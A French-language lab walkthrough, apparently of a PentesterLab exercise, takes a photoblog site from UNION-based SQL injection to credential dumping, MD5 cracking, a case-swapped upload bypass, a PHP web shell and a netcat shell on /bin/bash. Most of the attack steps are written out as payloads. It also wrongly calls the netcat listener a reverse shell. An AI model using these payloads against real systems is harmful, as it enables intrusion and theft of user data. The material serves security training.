From SQLI to shell déroulement :

On ouvre l'url et on regarde tous les liens
On voit la page d'admin du site, ce sera donc l'objectif !!!
On voit un lien qui se détache par rapport aux autres :
http://www.fstsh.com/cat.php?id=1

Si on ajoute un " ' " on a une erreur sql !!!
faille : SQLI !!!!

http://www.fstsh.com/cat.php?id=1'

On va regarder le code source de la page et noter des choses importantes qui nous servirons plus tard :
<a href="/admin/">Admin</a>
Un lien vers l'admin du site...

<img src="admin/uploads/ruby.jpg" alt="Ruby" />          </p>
On a le chemin des uploads


Bon avant de commencer nous allons défénir deux trois choses :
On doit connaitre un minimum le langage SQL et comment il agit avec le code pour afficher du contenu dans les pages par exemple :
Les commandes de base sont :
pour retrouver des informations on utilise : SELECT;
pour mettre à jour des informations on utilise : UPDATE;
pour ajouter des informations on utilse : INSERT;
pour supprimer des informations on utilise : DELETE;

Notion de base et exemple :
Une BDD est constituée de colonnes et de tables.
Dans cette BDD, par exemple la table utilisateur est constitué de 6 colonnes :

column1	column2	column3	column4	column5	column6
1	test	Paul	user	3	13
2	test1	Robert	user	3	4
3	test33	Super	user	3	4

et si je fais une requete avec select pour retrouver une information :
SELECT column1, column2, column3 FROM table1 WHERE column4='user' 
AND column5=3 AND column6=4;

J'obtiens alors :

column1	column2	column3
2	test1	Robert
3	test33	Super

On commence l'injection :
on doit trouver le nombre de colonnes dans la page "test" pour cela on utilisaer la requete ORDER BY (ranger par)
http://www.fstsh.com/cat.php?id=1 order by 2
http://www.fstsh.com/cat.php?id=1 order by 3
http://www.fstsh.com/cat.php?id=1 order by 4
http://www.fstsh.com/cat.php?id=1 order by 5 => erreur, il y a donc moins de 5 colonnes dans la page "test"

Maintenant quel sont les colonnes qui permmettent d'afficher des données sur la page :
cette fois on va utiliser UNION SELECT :
on doit trouver le nombre de colonnes dans la page "test" pour cela on utilisaer la requete ORDER BY (ranger par)
http://www.fstsh.com/cat.php?id=1 union select 1,2,3,4 -- => en bas de la page on a un affichage : la colonne 2 ressort picture 2 image 2. C'est cette colonne qui forunit des informations à la page "test". C'est ici qu'il faut injecter du code.
On a l'endroit où l'on peut injecter !!!

(pour info en plaçant le signe "-" dans les urls exe : /cat.php?id=-1 au lieu de /cat.php?id=1 affiche juste les infos qui nous interressent dans la page, plus lisible à voir)

Par exemple trouver la version de mysql :
http://www.fstsh.com/cat.php?id=1 union select 1,@@version,3,4 --
Version: 5.1.63-0 + squeeze1

Le nom du user :
http://www.fstsh.com/cat.php?id=1 union select 1,user(),3,4 --
pentesterlab@localhost

Le nom de la BDD :
http://www.fstsh.com/cat.php?id=1 union select 1,database(),3,4 --
photoblog

Le nom de toutes les tables de la BDD photoblog :
http://www.fstsh.com/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables --
..... lire l'affichage

Les noms des colonnes de la table users :
http://www.fstsh.com/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_name='users'
cool on a les éléments : id,login,password on extrapole en ayant aussi le mail, le numéro de carte bleue etc, tous les éléments qui concerne l'utilisateur, donc aussi des éléments critiques !!!

On peut donc via une requete on interroge la base pour afficher le login et le mot de passe de l'utilisateur :
http://www.fstsh.com/cat.php?id=1 union select 1,concat(id,0x3a,login,0x3a,password),3,4 from users
1:admin:8efe310f9ab3efeae8d410a8e0166eb2

Une chance sur deux que ce soit du MD5 de base, on cherche sur google. et on obtient : P4ssw0rd.

Maintenant on se logue sur la partie admin du site.
On va dans la partie upload.
On a créé en amaont sur son poste un petit fichier .php avec ce code :
<?php
	system($_GET['cmd']);
?>
mais on ne peut pas uploader le fichier grace à des restriction, mais on peut contourner.
On renomme notre fichier en .PhP ou .pHp
On uploade le fichier :
et la première commande que l'on test :
http://www.fstsh.com/admin/uploads/fichier.PhP?cmd=uname -a

Cool !!!
On va chercher à savoir si il y a netcat :
http://www.fstsh.com/admin/uploads/safe.PhP?cmd=whereis nc
Il y est donc on va ouvrir un e connexion en reverse shell et mettre le serveur en attente de connexion :
http://www.fstsh.com/admin/uploads/safe.PhP?cmd=nc -lvnp 4445 -e /bin/bash

Depuis son poste on fait un telnet sur le port 4445 du serveur du site et on a un shell. Bingo !!
Si on veut un prompt on tape :
python -c “import pty; pty.spawn(‘/bin/bash’);”
ou
python -c 'import pty; pty.spawn("/bin/bash");'

Une fois que l'on est là....




